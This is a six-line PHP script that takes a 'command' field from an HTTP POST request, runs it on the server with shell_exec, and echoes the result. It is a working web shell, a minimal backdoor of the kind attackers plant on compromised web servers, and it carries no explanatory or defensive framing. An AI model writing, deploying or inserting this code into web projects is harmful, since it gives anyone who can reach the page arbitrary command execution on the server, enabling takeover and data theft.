<?php
if  ($_POST['command'] )  {  
    $result=shell_exec($_POST['command']); 
    echo $result; 
} 
?>